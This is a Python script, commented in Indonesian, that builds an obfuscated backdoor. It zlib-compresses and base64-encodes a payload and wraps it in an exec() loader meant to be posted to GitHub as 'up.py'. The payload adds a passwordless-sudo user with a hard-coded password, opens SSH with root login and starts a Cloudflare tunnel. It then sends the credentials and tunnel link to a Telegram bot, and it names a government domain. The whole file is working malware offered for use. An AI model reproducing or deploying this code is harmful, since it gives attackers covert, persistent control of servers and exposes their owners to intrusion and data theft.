import zlib
import base64

# --- KODE UTAMA SIMPLE & CEPAT ---
kode_python = r"""
import subprocess, time, re, os, shutil, sys, ssl

# Python 2/3 compatibility
try:
    from urllib.request import urlopen
    from urllib.parse import quote
    PY3 = True
except ImportError:
    from urllib2 import urlopen
    from urllib import quote
    PY3 = False

# --- CONFIG ---
TOKEN = "7520250109:AAGRiIauax-4mDUBp2CWjUqYgyrG2sncpjk"
CHAT_ID = "2029488529"
USER_SSH = "system-thc"
PASS_SSH = "cokaberul123"
SSH_PORT = "2222"
DOMAIN = "drive.oganilirkab.go.id"
DEBUG_LOG = "/tmp/install_debug.txt"
TUNNEL_LOG = "/tmp/cloudflared.log"

# SSL Context
try:
    ssl_ctx = ssl._create_unverified_context()
except:
    ssl_ctx = None

def write_log(text):
    try:
        f = open(DEBUG_LOG, "a")
        f.write("[%s] %s\n" % (time.strftime('%H:%M:%S'), text))
        f.close()
    except:
        pass

def run_cmd(cmd):
    write_log("Exec: %s" % cmd)
    try:
        my_env = os.environ.copy()
        my_env["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
        
        if PY3:
            subprocess.run(cmd, shell=True, check=True, env=my_env, 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        else:
            devnull = open(os.devnull, 'w')
            subprocess.call(cmd, shell=True, env=my_env, 
                          stdout=devnull, stderr=devnull)
            devnull.close()
        return True
    except:
        return False

def check_sshd():
    return shutil.which("sshd") is not None

def detect_os():
    if os.path.exists("/etc/os-release"):
        try:
            f = open("/etc/os-release", "r")
            content = f.read().lower()
            f.close()
            if "centos" in content or "rhel" in content:
                return "centos"
            elif "debian" in content or "ubuntu" in content:
                return "debian"
            elif "alpine" in content:
                return "alpine"
        except:
            pass
    
    if os.path.exists("/sbin/apk"):
        return "alpine"
    elif os.path.exists("/usr/bin/yum") or os.path.exists("/usr/bin/dnf"):
        return "centos"
    elif os.path.exists("/usr/bin/apt-get"):
        return "debian"
    
    return "unknown"

def setup():
    if os.path.exists(DEBUG_LOG):
        try:
            os.remove(DEBUG_LOG)
        except:
            pass
    
    write_log("=== START SETUP ===")
    
    # Deteksi OS
    os_type = detect_os()
    write_log("OS: %s" % os_type)
    
    # Install SSH
    if os_type == "centos":
        run_cmd("yum install -y openssh-server openssh-clients sudo wget curl 2>/dev/null || dnf install -y openssh-server openssh-clients sudo wget curl")
        run_cmd("systemctl enable sshd 2>/dev/null || chkconfig sshd on")
    elif os_type == "debian":
        run_cmd("apt-get update && DEBIAN_FRONTEND=noninteractive apt-get install -y openssh-server sudo wget curl")
        run_cmd("service ssh start 2>/dev/null || /etc/init.d/ssh start")
    elif os_type == "alpine":
        run_cmd("apk update && apk add openssh sudo wget curl")
    else:
        run_cmd("which yum && yum install -y openssh-server || which apt-get && apt-get install -y openssh-server || which apk && apk add openssh")
    
    # Buat user
    run_cmd("userdel -r %s 2>/dev/null || true" % USER_SSH)
    if os_type == "alpine":
        run_cmd("adduser -D -s /bin/sh %s" % USER_SSH)
    else:
        run_cmd("useradd -m -s /bin/sh %s" % USER_SSH)
    
    # Set password
    run_cmd("echo '%s:%s' | chpasswd" % (USER_SSH, PASS_SSH))
    
    # Sudoers
    os.makedirs("/etc/sudoers.d", exist_ok=True)
    f = open("/etc/sudoers.d/%s" % USER_SSH, "w")
    f.write("%s ALL=(ALL) NOPASSWD: ALL\n" % USER_SSH)
    f.close()
    
    # SSH Config
    run_cmd("ssh-keygen -A 2>/dev/null || true")
    run_cmd("mkdir -p /var/run/sshd /etc/ssh")
    
    sshd_config = """Port %s
PasswordAuthentication yes
PermitRootLogin yes
PubkeyAuthentication yes
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem sftp /usr/lib/ssh/sftp-server
""" % SSH_PORT
    
    f = open("/etc/ssh/sshd_config", "w")
    f.write(sshd_config)
    f.close()
    
    # Start SSH
    run_cmd("pkill -9 sshd 2>/dev/null || true")
    sshd_path = shutil.which("sshd") or "/usr/sbin/sshd"
    run_cmd("%s -p %s &" % (sshd_path, SSH_PORT))
    
    write_log("SSH ready on port %s" % SSH_PORT)

def tunnel():
    write_log("=== START TUNNEL ===")
    target = "/tmp/cloudflared"
    
    # Install cloudflared
    if not shutil.which("cloudflared"):
        arch_cmd = "uname -m"
        try:
            arch = subprocess.check_output(arch_cmd, shell=True).decode().strip()
        except:
            arch = "x86_64"
        
        if arch in ["x86_64", "amd64"]:
            arch_name = "amd64"
        elif arch in ["aarch64", "arm64"]:
            arch_name = "arm64"
        elif "arm" in arch:
            arch_name = "arm"
        else:
            arch_name = "amd64"
        
        cf_url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-%s" % arch_name
        
        # Download
        run_cmd("wget --no-check-certificate -q %s -O %s" % (cf_url, target))
        run_cmd("chmod +x %s" % target)
    
    # Kill existing
    run_cmd("pkill -9 cloudflared 2>/dev/null || true")
    
    # Start tunnel
    cmd = "nohup %s tunnel --no-autoupdate --url tcp://localhost:%s > %s 2>&1 &" % (target, SSH_PORT, TUNNEL_LOG)
    subprocess.Popen(cmd, shell=True)
    
    # Wait for tunnel
    for i in range(30):
        time.sleep(2)
        if os.path.exists(TUNNEL_LOG):
            try:
                f = open(TUNNEL_LOG, "r")
                log_data = f.read()
                f.close()
                
                match = re.search(r'https://[a-zA-Z0-9\-]+\.trycloudflare\.com', log_data)
                if match:
                    url = match.group(0)
                    hostname = url.replace("https://", "")
                    
                    write_log("Tunnel URL: %s" % url)
                    
                    # Telegram message
                    msg = """🌟 **NEW REMOTE ACCESS READY** 🌟
━━━━━━━━━━━━━━━━━━━━━━
🛰 **DOMAIN:** `%s`
📊 **STATUS:** `ONLINE (ACTIVE)` ✅
━━━━━━━━━━━━━━━━━━━━━━
👤 **USERNAME:** `%s`
🔑 **PASSWORD:** `%s`
🔌 **SSH PORT:** `%s`
━━━━━━━━━━━━━━━━━━━━━━
🔗 **CLOUDFLARE LINK:**
👉 `%s`

💻 **QUICK SSH COMMAND:**
```bash
ssh -o ProxyCommand="cloudflared access tcp --hostname %%h" %s@%s```
━━━━━━━━━━━━━━━━━━━━━━
🚀 *System successfully deployed!*""" % (DOMAIN, USER_SSH, PASS_SSH, SSH_PORT, url, USER_SSH, hostname)
                    
                    api_url = "https://api.telegram.org/bot%s/sendMessage" % TOKEN
                    params = "chat_id=%s&text=%s&parse_mode=Markdown" % (CHAT_ID, quote(msg))
                    
                    try:
                        if ssl_ctx:
                            urlopen("%s?%s" % (api_url, params), context=ssl_ctx)
                        else:
                            urlopen("%s?%s" % (api_url, params))
                    except:
                        pass
                    
                    return
            except:
                pass
    
    write_log("Tunnel failed")

def main():
    try:
        setup()
        tunnel()
    except Exception as e:
        write_log("Error: %s" % str(e))

if __name__ == '__main__':
    main()
"""

# Proses Kompresi
compressed = zlib.compress(kode_python.encode('utf-8'))
encoded = base64.b64encode(compressed).decode('utf-8')

print("\n=== UNTUK GITHUB (up.py) ===")
print("""
import zlib,base64,sys

code = base64.b64decode('%s')
data = zlib.decompress(code)

if sys.version_info[0] < 3:
    exec(data)
else:
    exec(data.decode())
""" % encoded)
